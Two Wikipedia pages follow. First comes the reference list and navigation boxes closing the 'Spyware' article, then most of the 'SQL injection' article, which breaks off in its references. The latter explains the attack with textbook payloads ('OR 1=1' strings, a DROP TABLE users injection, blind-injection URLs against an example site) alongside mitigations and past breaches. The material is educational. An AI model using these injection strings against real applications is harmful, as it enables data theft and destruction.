"
. 
Ars Technica
. 
Archived
 from the original on November 6, 2012
. Retrieved 
June 15,
 2017
.




^
 
Cooley, Brian (March 7, 2011). 
"
'Like,' 'tweet' buttons divulge sites you visit: CNET News Video"
. 
CNet News
. 
Archived
 from the original on March 10, 2016
. Retrieved 
March 7,
 2011
.




^
 
Edelman, Ben; December 7, 2004 (updated February 8, 2005); 
Direct Revenue Deletes Competitors from Users' Disks
 
Archived
 July 6, 2010, at the 
Wayback Machine
; benedelman.com. Retrieved November 28, 2006.




^
 
"Microsoft Acquires Anti-Spyware Leader GIANT Company"
. 
PressPass
. December 16, 2004. 
Archived
 from the original on June 17, 2005
. Retrieved 
December 21,
 2020
.




^
 
Garms, Jason (November 4, 2005). 
"What's in a name?? A lot!! Announcing Windows Defender!"
. 
blogs.technet.com
. Archived from 
the original
 on November 23, 2005
. Retrieved 
December 21,
 2020
.




^
 
Dodson, Steve (November 4, 2005). 
"Microsoft Windows AntiSpyware is now......"Windows Defender""
. 
blogs.technet.com
. Archived from 
the original
 on November 24, 2005
. Retrieved 
December 21,
 2020
.




^
 
Qabalin, Majdi K.; Naser, Muawya; Alkasassbeh, Mouhammd (August 2, 2022). 
"Android Spyware Detection Using Machine Learning: A Novel Dataset"
. 
Sensors
. 
22
 (15): 5765. 
doi
:
10.3390/s22155765
. 
ISSN
 
1424-8220
. 
PMC
 
9371186
. 
PMID
 
35957337
.




^
 
Stefan Frei, Thomas Duebendofer, Gunter Ollman, and Martin May, 
Understanding the Web browser threat: Examination of vulnerable online Web browser populations and the insecurity iceberg
 
Archived
 September 11, 2016, at the 
Wayback Machine
, Communication Systems Group, 2008




^
 
Virvilis, Nikos; Mylonas, Alexios; Tsalis, Nikolaos; Gritzalis, Dimitris (2015). "Security Busters: Web Browser security vs. rogue sites". 
Computers & Security
. 
52
: 90–105. 
doi
:
10.1016/j.cose.2015.04.009
.




^
 
Schuster, Steve. "
"Blocking Marketscore: Why Cornell Did It"
. Archived from 
the original
 on February 14, 2007.
". Cornell University, Office of Information Technologies. March 31, 2005.




^
 
Vincentas (July 11, 2013). 
"Information About Spyware in SpyWareLoop.com"
. 
Spyware Loop
. Archived from 
the original
 on November 3, 2013
. Retrieved 
July 27,
 2013
.




^
 
Edelman, Ben (2004). "
The Effect of 180solutions on Affiliate Commissions and Merchants
 
Archived
 July 6, 2010, at the 
Wayback Machine
". 
Benedelman.org
. Retrieved November 14, 2006.




^
 
Ecker, Clint (2005). 
Massive spyware-based identity theft ring uncovered
 
Archived
 September 16, 2008, at the 
Wayback Machine
. Ars Technica, August 5, 2005.




^
 
Eckelberry, Alex. 
"Massive identity theft ring"
 
Archived
 May 11, 2011, at the 
Wayback Machine
, 
SunbeltBLOG,
 August 4, 2005.




^
 
Alex, Eckelberry (August 9, 2005). 
"Identity Theft? What to do?"
. 
The Legacy Sunbelt Software Blog
. 
Archived
 from the original on March 19, 2018
. Retrieved 
March 19,
 2018
.




^
 
FTC Releases Survey of Identity Theft in U.S. 27.3 Million Victims in Past 5 Years, Billions in Losses for Businesses and Consumers
 
Archived
 May 18, 2008, at the 
Wayback Machine
. Federal Trade Commission, September 3, 2003.




^
 
Russinovich, Mark. 
"Sony, Rootkits and Digital Rights Management Gone Too Far,"
 
Archived
 April 28, 2010, at the 
Wayback Machine
, 
Mark's Blog,
 October 31, 2005. Retrieved November 22, 2006.




^
 
Press release from the Texas Attorney General's office, November 21, 2005; 
Attorney General Abbott Brings First Enforcement Action In Nation Against Sony BMG For Spyware Violations
 
Archived
 July 25, 2010, at the 
Wayback Machine
. Retrieved November 28, 2006.




^
 
"Sony sued over copy-protected CDs; Sony BMG is facing three lawsuits over its controversial anti-piracy software"
 
Archived
 May 30, 2009, at the 
Wayback Machine
, 
BBC News,
 November 10, 2005. Retrieved November 22, 2006.




^
 
Information About XCP Protected CDs
. Retrieved November 29, 2006.




^
 
"Description of the Windows Genuine Advantage Notifications application"
. 
Microsoft Support
. Archived from 
the original
 on June 18, 2010
. Retrieved 
June 13,
 2006
.




^
 
Weinstein, Lauren. 
Windows XP update may be classified as 'spyware'
 
Archived
 July 9, 2012, at 
archive.today
, 
Lauren Weinstein's Blog,
 June 5, 2006. Retrieved June 13, 2006.




^
 
Evers, Joris. 
Microsoft's antipiracy tool phones home daily
 
Archived
 August 28, 2012, at the 
Wayback Machine
, 
CNET,
 June 7, 2006. Retrieved August 31, 2014.




^
 
"Creator and Four Users of Loverspy Spyware Program Indicted"
. Department of Justice. August 26, 2005. Archived from 
the original
 on November 19, 2013
. Retrieved 
November 21,
 2014
.




^
 
"Tracking Cookie"
. Symantec. Archived from 
the original
 on January 6, 2010
. Retrieved 
April 28,
 2013
.




^
 
Mehrotra, Dhruv. 
"The Ungodly Surveillance of Anti-Porn 'Shameware' Apps"
. 
Wired
. 
ISSN
 
1059-1028
. Retrieved 
September 22,
 2022
.




^ 
a
 
b
 
Timberg, Craig; Albergotti, Reed; Guéguen, Elodie (July 19, 2021). 
"Despite the hype, Apple security no match for NSO spyware - International investigation finds 23 Apple devices that were successfully hacked"
. 
The Washington Post
. 
Archived
 from the original on July 19, 2021
. Retrieved 
July 19,
 2021
.




^
 
"Activists and journalists in Mexico complain of government spying"
. 
Reuters
. June 20, 2017. Archived from 
the original
 on May 13, 2023
. Retrieved 
June 20,
 2017
.




^ 
a
 
b
 
Franceschi-Bicchierai, Lorenzo (August 25, 2016). 
"Government Hackers Caught Using Unprecedented iPhone Spy Tool"
. 
VICE Magazine
. Archived from 
the original
 on February 24, 2023
. Retrieved 
August 25,
 2016
.




^
 
Roberts, Paul F. (May 26, 2005). 
"Spyware-Removal Program Tagged as a Trap"
. 
eWeek
. Retrieved 
September 4,
 2008
.
[
permanent dead link
]




^
 
Howes, Eric L. "
The Spyware Warrior List of Rogue/Suspect Anti-Spyware Products & Web Sites
 
Archived
 September 22, 2018, at the 
Wayback Machine
". Retrieved July 10, 2005.




^
 
Also known as WinAntiVirusPro, ErrorSafe, SystemDoctor, WinAntiSpyware, AVSystemCare, WinAntiSpy, Windows Police Pro, Performance Optimizer, StorageProtector, PrivacyProtector, WinReanimator, DriveCleaner, WinspywareProtect, PCTurboPro, FreePCSecure, ErrorProtector, SysProtect, WinSoftware, XPAntivirus, Personal Antivirus, Home Antivirus 20xx, VirusDoctor, and ECsecure




^
 
Elinor Mills (April 27, 2010). 
"Google: Fake antivirus is 15 percent of all malware"
. 
CNET
. Archived from 
the original
 on May 10, 2011
. Retrieved 
November 5,
 2011
.




^
 
McMillan, Robert. 
Antispyware Company Sued Under Spyware Law
 
Archived
 July 6, 2008, at the 
Wayback Machine
. 
PC World,
 January 26, 2006.




^
 
"
Lawsuit filed against 180solutions
 
Archived
 June 22, 2008, at the 
Wayback Machine
". 
zdnet.com
 September 13, 2005




^
 
Hu, Jim. "
180solutions sues allies over adware
 
Archived
 August 10, 2011, at the 
Wayback Machine
". 
news.com
 July 28, 2004




^
 
Coollawyer; 2001–2006; 
Privacy Policies, Terms and Conditions, Website Contracts, Website Agreements
 
Archived
 May 13, 2013, at the 
Wayback Machine
; coollawyer.com. Retrieved November 28, 2006.




^
 
"
CHAPTER 715 Computer Spyware and Malware Protection
 
Archived
 April 6, 2012, at the 
Wayback Machine
". 
nxtsearch.legis.state.ia.us
. Retrieved May 11, 2011.




^
 
Chapter 19.270 RCW: Computer spyware
 
Archived
 July 21, 2011, at the 
Wayback Machine
. 
apps.leg.wa.gov
. Retrieved November 14, 2006.




^
 
Gross, Grant. 
US lawmakers introduce I-Spy bill
 
Archived
 January 8, 2009, at the 
Wayback Machine
. 
InfoWorld,
 March 16, 2007. Retrieved March 24, 2007.




^
 
See 
Federal Trade Commission v. Sperry & Hutchinson Trading Stamp Co.




^
 
 
FTC Permanently Halts Unlawful Spyware Operations
 
Archived
 November 2, 2013, at the 
Wayback Machine
 (FTC press release with links to supporting documents); see also 
FTC cracks down on spyware and PC hijacking, but not true lies
 
Archived
 December 26, 2010, at the 
Wayback Machine
, Micro Law, IEEE MICRO (Jan.-Feb. 2005), also available at 
IEEE Xplore
 .




^
 
See 
Court Orders Halt to Sale of Spyware
 
Archived
 December 4, 2010, at the 
Wayback Machine
 (FTC press release November 17, 2008, with links to supporting documents).




^
 
OPTA (November 5, 2007). 
"Besluit van het college van de Onafhankelijke Post en Telecommunicatie Autoriteit op grond van artikel 15.4 juncto artikel 15.10 van de Telecommunicatiewet tot oplegging van boetes ter zake van overtredingen van het gestelde bij of krachtens de Telecommunicatiewet"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on January 29, 2011.




^
 
"State Sues Major "Spyware" Distributor"
 (Press release). Office of New York State Attorney General. April 28, 2005. Archived from 
the original
 on January 10, 2009
. Retrieved 
September 4,
 2008
. 
Attorney General Spitzer today sued one of the nation's leading internet marketing companies, alleging that the firm was the source of "spyware" and "adware" that has been secretly installed on millions of home computers.




^
 
Gormley, Michael. 
"Intermix Media Inc. says it is settling spyware lawsuit with N.Y. attorney general"
. 
Yahoo!
 News
. June 15, 2005. Archived from 
the original
 on June 22, 2005.




^
 
Gormley, Michael (June 25, 2005). 
"Major advertisers caught in spyware net"
. 
USA Today
. 
Archived
 from the original on September 20, 2008
. Retrieved 
September 4,
 2008
.




^
 
Festa, Paul. "
See you later, anti-Gators?
 
Archived
 July 14, 2014, at the 
Wayback Machine
". 
News.com
. October 22, 2003.




^
 
"
Gator Information Center
 
Archived
 July 1, 2005, at the 
Wayback Machine
". 
pcpitstop.com
 November 14, 2005.




^ 
a
 
b
 
"Initial LANrev System Findings"
 
Archived
 June 15, 2010, at the 
Wayback Machine
, LMSD Redacted Forensic Analysis, L-3 Services – prepared for 
Ballard Spahr
 (LMSD's counsel), May 2010. Retrieved August 15, 2010.




^
 
Doug Stanglin (February 18, 2010). 
"School district accused of spying on kids via laptop webcams"
. 
USA Today
. 
Archived
 from the original on September 13, 2012
. Retrieved 
February 19,
 2010
.




^
 
"Suit: Schools Spied on Students Via Webcam"
. 
CBS NEWS
. March 8, 2010. 
Archived
 from the original on August 1, 2013
. Retrieved 
July 29,
 2013
.






External links
[
edit
]








Wikimedia Commons has media related to 
Spyware
.




Home Computer Security – Carnegie Mellon Software Institute


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Software distribution
Licenses


Beerware


Floating licensing


Free and open-source


Free


Open source


Freely redistributable


License-free


Proprietary


Public domain


Source-available


Compensation models


Adware


Commercial software


Retail software


Crippleware


Crowdfunding


Freemium


Freeware


Pay what you want


Careware


Donationware


Open-core model


Postcardware


Shareware


Nagware


Trialware


Delivery methods


Digital distribution


File sharing


On-premises


Pre-installed


Product bundling


Retail software


Sneakernet


Software as a service


Deceptive and/or illicit


Unwanted software bundling


Malware


Infostealer


Ransomware


Spyware


Trojan horse


Worm


Scareware


Shovelware


Software release life cycle


Abandonware


End-of-life


Long-term support


Software maintenance


Software maintainer


Software publisher


Vaporware


list


Copy protection


Digital rights management


Software protection dongle


License manager


Product activation


Product key


Software copyright


Software license server


Software patent


Torrent poisoning




Authority control databases
: National 
Germany
United States
Japan
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Spyware&oldid=1243369614
"


Categories
: 
Spyware
Types of malware
Rogue security software
Computer network security
Online advertising
Espionage techniques
Espionage devices
Identity theft
Security breaches
Deception
Hidden categories: 
All articles with dead external links
Articles with dead external links from June 2016
Webarchive template wayback links
Webarchive template archiveis links
Articles with dead external links from December 2021
Articles with permanently dead external links
Articles with short description
Short description matches Wikidata
Use mdy dates from April 2016
Articles containing potentially dated statements from 2006
All articles containing potentially dated statements
Articles containing German-language text
Articles needing additional references from December 2018
All articles needing additional references
Articles with hatnote templates targeting a nonexistent page
Articles containing potentially dated statements from 2005
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






Computer hacking technique






A classification of SQL injection attacking vector as of 2010


In computing, 
SQL injection
 is a 
code injection
 technique used to 
attack
 data-driven applications, in which malicious 
SQL
 statements are inserted into an entry field for execution (e.g. to dump the 
database
 contents to the attacker).
[
1
]
[
2
]
 SQL injection must exploit a 
security vulnerability
 in an application's software, for example, when user input is either incorrectly filtered for 
string literal
 
escape characters
 embedded in SQL statements or user input is not 
strongly typed
 and unexpectedly executed. SQL injection is mostly known as an 
attack vector
 for websites but can be used to attack any type of SQL database.

SQL injection attacks allow attackers to 
spoof
 identity, tamper with existing 
data
, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. Document-oriented 
NoSQL
 databases can also be affected by this security vulnerability.
[
3
]


In a 2012 study, it was observed that the average 
web application
 received four attack campaigns per month, and retailers received twice as many attacks as other industries.
[
4
]






History
[
edit
]


Discussions of SQL injection, such as a 1998 article in 
Phrack Magazine
, began in the late 1990s.
[
5
]
 SQL injection was considered one of the top 10 web application vulnerabilities of 2007 and 2010 by the 
Open Web Application Security Project
.
[
6
]
 In 2013, SQL injection was rated the number one attack on the OWASP top ten.
[
7
]




Root causes
[
edit
]


SQL Injection is a common security vulnerability that arises from letting attacker supplied data become SQL code. This happens when programmers assemble SQL queries either by string interpolation or by concatenating SQL commands with user supplied data.



Incorrectly constructed SQL statements
[
edit
]


This form of injection relies on the fact that SQL statements consist of both data used by the SQL statement and commands that control how the SQL statement is executed. For example, in the SQL statement 
select
 
*
 
from
 
person
 
where
 
name
 
=
 
'susan'
 
and
 
age
 
=
 
2
 the string '
susan
' is data and the fragment 
and
 
age
 
=
 
2
 is an example of a command (the value 
2
 is also data in this example).

SQL injection occurs when specially crafted user input is processed by the receiving program in a way that allows the input to exit a data context and enter a command context. This allows the attacker to alter the structure of the SQL statement which is executed.

As a simple example, imagine that the data '
susan
' in the above statement was provided by user input. The user entered the string '
susan
' (without the apostrophes) in a web form text entry field, and the program used 
string concatenation
 statements to form the above SQL statement from the three fragments 
select
 
*
 
from
 
person
 
where
 
name
=
'
, the user input of '
susan
', and 
'
 
and
 
age
 
=
 
2
.

Now imagine that instead of entering '
susan
' the attacker entered 
'
 
or
 
1
=
1
;
 
--
.

The program will use the same string concatenation approach with the 3 fragments of 
select
 
*
 
from
 
person
 
where
 
name
=
'
, the user input of 
'
 
or
 
1
=
1
;
 
--
, and 
'
 
and
 
age
 
=
 
2
 and construct the statement 
select
 
*
 
from
 
person
 
where
 
name
=
''
 
or
 
1
=
1
;
 
-- and age = 2
. Many databases will ignore the text after the '--' string as this denotes a comment. The structure of the SQL command is now 
select
 
*
 
from
 
person
 
where
 
name
=
''
 
or
 
1
=
1
;
 and this will select all person rows rather than just those named 'susan' whose age is 2. The attacker has managed to craft a data string which exits the data context and entered a command context.

A more complex example is now presented.

Imagine a program creates a SQL statement using the following string assignment command :

var
 
statement
 
=
 
"SELECT * FROM users WHERE name = '"
 
+
 
userName
 
+
 
"'"
;


This SQL code is designed to pull up the records of the specified username from its table of users. However, if the "userName" variable is crafted in a specific way by a malicious user, the SQL statement may do more than the code author intended. For example, setting the "userName" variable as:



' OR '1'='1


or using comments to even block the rest of the query (there are three types of SQL comments
[
8
]
). All three lines have a space at the end:



' OR '1'='1' --
' OR '1'='1' {
' OR '1'='1' /* 


renders one of the following SQL statements by the parent language:



SELECT
 
*
 
FROM
 
users
 
WHERE
 
name
 
=
 
''
 
OR
 
'1'
=
'1'
;




SELECT
 
*
 
FROM
 
users
 
WHERE
 
name
 
=
 
''
 
OR
 
'1'
=
'1'
 
-- ';




If this code were to be used in authentication procedure then this example could be used to force the selection of every data field (*) from 
all
 users rather than from one specific user name as the coder intended,  because the evaluation of '1'='1' is always true.

The following value of "userName" in the statement below would cause the deletion of the "users" table as well as the selection of all data from the "userinfo" table (in essence revealing the information of every user), using an 
API
 that allows multiple statements:

a';
DROP
 
TABLE
 
users
;
 
SELECT
 
*
 
FROM
 
userinfo
 
WHERE
 
't'
 
=
 
'
t


This input renders the final SQL statement as follows and specified:



SELECT
 
*
 
FROM
 
users
 
WHERE
 
name
 
=
 
'a'
;
DROP
 
TABLE
 
users
;
 
SELECT
 
*
 
FROM
 
userinfo
 
WHERE
 
't'
 
=
 
't'
;




While most SQL server implementations allow multiple statements to be executed with one call in this way, some SQL APIs such as 
PHP
's 
mysql_query()
 function do not allow this for security reasons. This prevents attackers from injecting entirely separate queries, but doesn't stop them from modifying queries.



Blind SQL injection
[
edit
]


Blind SQL injection is used when a web application is vulnerable to a SQL injection, but the results of the injection are not visible to the attacker. The page with the vulnerability may not be one that displays data but will display differently depending on the results of a logical statement injected into the legitimate SQL statement called for that page.
This type of attack has traditionally been considered time-intensive because a new statement needed to be crafted for each bit recovered, and depending on its structure, the attack may consist of many unsuccessful requests. Recent advancements have allowed each request to recover multiple bits, with no unsuccessful requests, allowing for more consistent and efficient extraction.
[
9
]
 There are several tools that can automate these attacks once the location of the vulnerability and the target information has been established.
[
10
]




Conditional responses
[
edit
]


One type of blind SQL injection forces the database to evaluate a logical statement on an ordinary application screen. As an example, a book review website uses a 
query string
 to determine which book review to display. So the 
URL
 
https://books.example.com/review?id=5
 would cause the server to run the query



SELECT
 
*
 
FROM
 
bookreviews
 
WHERE
 
ID
 
=
 
'5'
;




from which it would populate the review page with data from the review with 
ID
 5, stored in the 
table
 bookreviews. The query happens completely on the server; the user does not know the names of the database, table, or fields, nor does the user know the query string. The user only sees that the above URL returns a book review. A 
hacker
 can load the URLs 
https
:
//
books
.
example
.
com
/
review
?
id
=
5
' OR '
1
'='
1
 and 
https
:
//
books
.
example
.
com
/
review
?
id
=
5
' AND '
1
'='
2
, which may result in queries



SELECT
 
*
 
FROM
 
bookreviews
 
WHERE
 
ID
 
=
 
'5'
 
OR
 
'1'
=
'1'
;


SELECT
 
*
 
FROM
 
bookreviews
 
WHERE
 
ID
 
=
 
'5'
 
AND
 
'1'
=
'2'
;




respectively. If the original review loads with the "1=1" URL and a blank or error page is returned from the "1=2" URL, and the returned page has not been created to alert the user the input is invalid, or in other words, has been caught by an input test script, the site is likely vulnerable to an SQL injection attack as the query will likely have passed through successfully in both cases. The hacker may proceed with this query string designed to reveal the version number of 
MySQL
 running on the server: 
https
://
books
.
example
.
com
/
review
?
id
=
5
 
AND
 
substring
(
@@version
,
 
1
,
 
INSTR
(
@@version
,
 
'.'
)
 
-
 
1
)
=
4
, which would show the book review on a server running MySQL 4 and a blank or error page otherwise. The hacker can continue to use code within query strings to achieve their goal directly, or to glean more information from the server in hopes of discovering another avenue of attack.
[
11
]
[
12
]




Second-order SQL injection
[
edit
]


Second-order SQL injection occurs when submitted values contain malicious commands that are stored rather than executed immediately.  In some cases, the application may correctly encode a SQL statement and store it as valid SQL.  Then, another part of that application without controls to protect against SQL injection might execute that stored SQL statement.  This attack requires more knowledge of how submitted values are later used.  Automated web application security scanners would not easily detect this type of SQL injection and may need to be manually instructed where to check for evidence that it is being attempted.



Mitigation
[
edit
]


An SQL injection is a well known attack and easily prevented by simple measures. After an apparent SQL injection 
attack on TalkTalk
 in 2015, the 
BBC
 reported that security experts were stunned that such a large company would be vulnerable to it.
[
13
]
 Techniques like pattern matching, software testing, and grammar analysis are some common ways to mitigate these attacks.
[
2
]




Escaping
[
edit
]


The simplest way to prevent injections is to 
escape
 all characters that have a special meaning in SQL. The manual for an SQL DBMS explains which characters have a special meaning, which allows creating a comprehensive 
blacklist
 of characters that need translation. For instance, every occurrence of a single quote (
'
) in a string parameter must be prepended with a backslash (
\
) so that the database understands the single quote is part of a given string, rather than its terminator. 
PHP
 provides the 
mysqli_real_escape_string()
 function to escape strings according to 
MySQL
 semantics; the following example parameterizes a SQL query by escaping username and password parameters: 



$mysqli
 
=
 
new
 
mysqli
(
'hostname'
,
 
'db_username'
,
 
'db_password'
,
 
'db_name'
);


$query
 
=
 
sprintf
(
"SELECT * FROM `Users` WHERE UserName='%s' AND Password='%s'"
,

                  
$mysqli
->
real_escape_string
(
$username
),

                  
$mysqli
->
real_escape_string
(
$password
));


$mysqli
->
query
(
$query
);




Depending solely on the programmer to diligently escape all query parameters presents inherent risks, given the potential for oversights in the process. To mitigate this vulnerability, programmers may opt to develop their own 
abstraction
 layers to automate the escaping of parameters.
[
14
]




Object relational mappers
[
edit
]


Object–relational mapping
 (ORM) frameworks such as 
Hibernate
 and 
ActiveRecord
 provide an object-oriented interface for queries over a relational database. Most, if not all, ORMs, automatically handle the escaping needed to prevent SQL injection attacks, as a part of the framework's query API. However, many ORMs provide the ability to bypass their mapping facilities and emit raw SQL statements; improper use of this functionality can introduce the possibility for an injection attack.
[
15
]




Parameterized statements
[
edit
]


Main article: 
Prepared statement


With most development platforms, parameterized statements that work with parameters can be used  (sometimes called placeholders or 
bind variables
) instead of embedding user input in the statement. A placeholder can only store a value of the given type and not an arbitrary SQL fragment. Hence the SQL injection would simply be treated as a strange (and probably invalid) parameter value. In many cases, the SQL statement is fixed, and each parameter is a 
scalar
, not a 
table
. The user input is then assigned (bound) to a parameter.
[
16
]




Pattern check
[
edit
]


Integer, float, or Boolean string parameters can be checked to determine if their value is a valid representation of the given type. Strings that must adhere to a specific pattern or condition (e.g. dates, 
UUIDs
, phone numbers) can also be checked to determine if said pattern is matched.



Database permissions
[
edit
]


Limiting the permissions on the database login used by the web application to only what is needed may help reduce the effectiveness of any SQL injection attacks that exploit any bugs in the web application.

For example, on 
Microsoft SQL Server
, a database logon could be restricted from selecting on some of the system tables which would limit exploits that try to insert JavaScript into all the text columns in the database.



deny
 
select
 
on
 
sys
.
sysobjects
 
to
 
webdatabaselogon
;


deny
 
select
 
on
 
sys
.
objects
 
to
 
webdatabaselogon
;


deny
 
select
 
on
 
sys
.
tables
 
to
 
webdatabaselogon
;


deny
 
select
 
on
 
sys
.
views
 
to
 
webdatabaselogon
;


deny
 
select
 
on
 
sys
.
packages
 
to
 
webdatabaselogon
;




Examples
[
edit
]


In February 2002, Jeremiah Jacks discovered that Guess.com was vulnerable to an SQL injection attack, permitting anyone able to construct a properly-crafted URL to pull down 200,000+ names, credit card numbers and expiration dates in the site's customer database.
[
17
]


On November 1, 2005, a teenaged hacker used SQL injection to break into the site of a 
Taiwanese
 information security magazine from the Tech Target group and steal customers' information.
[
18
]


On January 13, 2006, 
Russian
 computer criminals broke into a 
Rhode Island government
 website and allegedly stole credit card data from individuals who have done business online with state agencies.
[
19
]


On September 19, 2007 and January 26, 2009 the Turkish hacker group "m0sted" used SQL injection to exploit Microsoft's SQL Server to hack web servers belonging to 
McAlester Army Ammunition Plant
 and the 
US Army Corps of Engineers
 respectively.
[
20
]


On April 13, 2008, the 
Sexual and Violent Offender Registry
 of 
Oklahoma
 shut down its website for "
routine maintenance
" after being informed that 10,597 
Social Security numbers
 belonging to 
sex offenders
 had been downloaded via an SQL injection attack
[
21
]


On August 17, 2009, the 
United States Department of Justice
 charged an American citizen, 
Albert Gonzalez
, and two unnamed Russians with the theft of 130 million credit card numbers using an SQL injection attack. In reportedly "the biggest case of 
identity theft
 in American history", the man stole cards from a number of corporate victims after researching their 
payment processing systems
. Among the companies hit were credit card processor 
Heartland Payment Systems
, convenience store chain 
7-Eleven
, and supermarket chain 
Hannaford Brothers
.
[
22
]


In July 2010, a South American security researcher who goes by the 
handle
 "Ch Russo" obtained sensitive user information from popular 
BitTorrent
 site 
The Pirate Bay
. He gained access to the site's administrative control panel and exploited an SQL injection vulnerability that enabled him to collect user account information, including 
IP addresses
, 
MD5
 
password hashes
 and records of which torrents individual users have uploaded.
[
23
]


From July 24 to 26, 2010, attackers from 
Japan
 and 
China
 used an SQL injection to gain access to customers' credit card data from Neo Beat, an 
Osaka
-based company that runs a large online supermarket site. The attack also affected seven business partners including supermarket chains Izumiya Co, Maruetsu Inc, and Ryukyu Jusco Co. The theft of data affected a reported 12,191 customers. As of August 14, 2010 it was reported that there have been more than 300 cases of credit card information being used by third parties to purchase goods and services in China.


On September 19 during the 
2010 Swedish general election
 a voter attempted a code injection by hand writing SQL commands as part of a 
write-in
 vote.
[
24
]


On November 8, 2010 the British 
Royal Navy
 website was compromised by a Romanian hacker named 
TinKode
 using SQL injection.
[
25
]
[
26
]


On April 11, 2011, 
Barracuda Networks
 was compromised using an SQL injection flaw. 
Email addresses
 and usernames of employees were among the information obtained.
[
27
]


Over a period of 4 hours on April 27, 2011, an automated SQL injection attack occurred on 
Broadband Reports
 website that was able to extract 8% of the username/password pairs: 8,000 random accounts of the 9,000 active and 90,000 old or inactive accounts.
[
28
]
[
29
]
[
30
]


On June 1, 2011, "
hacktivists
" of the group 
LulzSec
 were accused of using SQL injection to steal 
coupons
, download keys, and passwords that were stored in plaintext on 
Sony
's website, accessing the personal information of a million users.
[
31
]


In June 2011, 
PBS
 was hacked by LulzSec, most likely through use of SQL injection; the full process used by hackers to execute SQL injections was described in this 
Imperva
 blog.
[
32
]


In July 2012
 a hacker group was reported to have stolen 450,000 login credentials from 
Yahoo!
. The logins were stored in 
plain text
 and were allegedly taken from a Yahoo 
subdomain
, 
Yahoo! Voices
. The group breached Yahoo's security by using a "
union
-based SQL injection technique".
[
33
]
[
34
]


On October 1, 2012, a hacker group called "Team GhostShell" published the personal records of students, faculty, employees, and alumni from 53 universities, including 
Harvard
, 
Princeton
, 
Stanford
, 
Cornell
, 
Johns Hopkins
, and the 
University of Zurich
 on 
pastebin.com
. The hackers claimed that they were trying to "raise awareness towards the changes made in today's education", bemoaning changing education laws in Europe and increases in 
tuition in the United States
.
[
35
]


On November 4, 2013, hacktivist group "RaptorSwag" allegedly compromised 71 Chinese government databases using an SQL injection attack on the Chinese Chamber of International Commerce. The leaked data was posted publicly in cooperation with 
Anonymous
.
[
36
]


In August 2014, 
Milwaukee
-based computer security company Hold Security disclosed that it uncovered 
a theft of confidential information
 from nearly 420,000 websites through SQL injections.
[
37
]
 
The New York Times
 confirmed this finding by hiring a security expert to check the claim.
[
38
]


In October 2015, an SQL injection attack was used to steal the personal details of 156,959 customers from British telecommunications company 
TalkTalk's
 servers, exploiting a vulnerability in a legacy web portal.
[
39
]


In early 2021, 70 gigabytes of data was 
exfiltrated
 from the far-right website 
Gab
 through an SQL injection attack. The vulnerability was introduced into the Gab codebase by Fosco Marotto, Gab's 
CTO
.
[
40
]
 A second attack against Gab was launched the next week using 
OAuth2
 tokens stolen during the first attack.
[
41
]


In popular culture
[
edit
]


A 2007 
xkcd
 cartoon involved a character 
Robert'); DROP TABLE Students;--
 named to carry out an SQL injection. As a result of this cartoon, SQL injection is sometimes informally referred to as "Bobby Tables".
[
42
]
[
43
]


Unauthorized login to websites by means of SQL injection forms the basis of one of the subplots in 
J.K. Rowling
's 2012 novel 
The Casual Vacancy
.


In 2014, an individual in Poland legally renamed his business to 
Dariusz Jakubowski x'; DROP TABLE users; SELECT '1
 in an attempt to disrupt operation of spammers' 
harvesting bots
.
[
44
]


The 2015 game 
Hacknet
 has a hacking program called SQL_MemCorrupt. It is described as injecting a table entry that causes a corruption error in an SQL database, then queries said table, causing an SQL database crash and core dump.


See also
[
edit
]


Code injection


Cross-site scripting


Metasploit Project


OWASP
 Open Web Application Security Project


Prompt injection
, a similar concept applied to artificial intelligence


SGML entity


Uncontrolled format string


w3af


Web application security


References
[
edit
]






^
 
Microsoft. 
"SQL Injection"
. 
Archived
 from the original on August 2, 2013
. Retrieved 
August 4,
 2013
. 
SQL injection is an attack in which malicious code is inserted into strings that are later passed to an instance of SQL Server for parsing and execution. Any procedure that constructs SQL statements should be reviewed for injection vulnerabilities because SQLi Server will execute all syntactically valid queries that it receives. Even parameterized data can be manipulated by a skilled and determined attacker.




^ 
a
 
b
 
Zhuo, Z.; Cai, T.; Zhang, X.; Lv, F. (April 2021). "Long short-term memory on abstract syntax tree for SQL injection detection". 
IET Software
. 
15
